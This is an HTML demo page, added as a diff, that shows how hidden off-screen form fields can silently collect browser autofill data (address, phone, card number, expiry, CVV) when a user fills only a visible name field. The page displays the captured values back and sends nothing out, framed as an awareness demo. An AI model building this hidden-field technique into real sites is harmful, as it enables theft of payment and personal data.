@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Autofill Form Spy Demo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 20px;
+        }
+        .maindiv {
+            max-width: 800px;
+            margin: 40px auto;
+            text-align: center;
+        }
+        .title {
+            color: #2c3e50;
+            font-size: 2.5em;
+            margin-bottom: 30px;
+        }
+        .subtitle {
+            color: #7f8c8d;
+            font-size: 1.2em;
+            margin-bottom: 30px;
+        }
+        form {
+            width: 400px;
+            margin: auto;
+            padding: 30px;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+        }
+        #fullname {
+            display: block;
+            margin-top: 15px;
+            padding: 12px;
+            width: 100%;
+            box-sizing: border-box;
+            border: 2px solid #3498db;
+            border-radius: 20px;
+            font-size: 16px;
+        }
+        button {
+            margin-top: 20px;
+            padding: 12px;
+            width: 100%;
+            background-color: #3498db;
+            color: white;
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #2980b9;
+        }
+        #result {
+            display: none;
+            margin-top: 30px;
+            padding: 20px;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            text-align: left;
+        }
+        .result-item {
+            margin: 10px 0;
+            padding: 5px;
+            border-bottom: 1px solid #eee;
+        }
+        .result-label {
+            font-weight: bold;
+            color: #2c3e50;
+        }
+    </style>
+</head>
+<body>
+<div class="maindiv">
+    <h1 class="title">Autofill Form Spy Demo</h1>
+    <p class="subtitle">This demo demonstrates how certain sites might obtain autofill data maliciously.</p>
+    
+    <form id="autofillForm" autocomplete="on">
+        <label for="fullname" style="font-size: 18px;">Enter your Name using Autofill</label>
+        <input type="text" id="fullname" name="fullname" autocomplete="name" placeholder="Your Name">
+        
+        <div style="margin-left:-1000rem; position:absolute">
+            <label for="email">Email</label>
+            <input type="email" id="email" name="email" autocomplete="email">
+            <br>
+            <label for="phone">Phone Number</label>
+            <input type="tel" id="phone" name="phone" autocomplete="tel">
+            <br>
+            <!-- Address Information -->
+            <label for="address">Street Address</label>
+            <input type="text" id="address" name="address" autocomplete="street-address">
+            <br>
+            <label for="city">City</label>
+            <input type="text" id="city" name="city" autocomplete="address-level2">
+            <br>
+            <label for="state">State/Province</label>
+            <input type="text" id="state" name="state" autocomplete="address-level1">
+            <br>
+            <label for="zip">Postal Code</label>
+            <input type="text" id="zip" name="zip" autocomplete="postal-code">
+            <br>
+            <label for="country">Country</label>
+            <input type="text" id="country" name="country" autocomplete="country">
+            <br>
+            <!-- Payment Information -->
+            <label for="cc-name">Cardholder Name</label>
+            <input type="text" id="cc-name" name="cc-name" autocomplete="cc-name">
+            <br>
+            <label for="cc-number">Credit Card Number</label>
+            <input type="text" id="cc-number" name="cc-number" autocomplete="cc-number">
+            <br>
+            <label for="cc-exp">Expiration Date</label>
+            <input type="text" id="cc-exp" name="cc-exp" autocomplete="cc-exp">
+            <br>
+            <label for="cc-csc">CVV</label>
+            <input type="password" id="cc-csc" name="cc-csc" autocomplete="cc-csc">
+        </div>
+        <br>
+        <button type="submit">Show Captured Data</button>
+    </form>
+
+    <div id="result">
+        <h2>Captured Information: (If you have stored the address in Autofill.)</h2>
+        <div id="resultContent"></div>
+    </div>
+</div>
+
+<script>
+document.getElementById('autofillForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    const formData = {
+        'Full Name': document.getElementById('fullname').value,
+        'Email': document.getElementById('email').value,
+        'Phone': document.getElementById('phone').value,
+        'Address': document.getElementById('address').value,
+        'City': document.getElementById('city').value,
+        'State': document.getElementById('state').value,
+        'ZIP Code': document.getElementById('zip').value,
+        'Country': document.getElementById('country').value,
+        'Card Holder': document.getElementById('cc-name').value,
+        'Card Number': document.getElementById('cc-number').value,
+        'Card Expiry': document.getElementById('cc-exp').value,
+        'CVV': document.getElementById('cc-csc').value
+    };
+
+    const resultContent = document.getElementById('resultContent');
+    resultContent.innerHTML = '';
+    
+    for (var [key, value] of Object.entries(formData)) {
+        if (!value) {  
+            value = "(Not Found)"
+        }
+        const item = document.createElement('div');
+        item.className = 'result-item';
+        item.innerHTML = `<span class="result-label">${key}:</span> ${value}`;
+        resultContent.appendChild(item);
+        
+    }
+
+    document.getElementById('result').style.display = 'block';
+});
+</script>
+
+</body>
+</html>
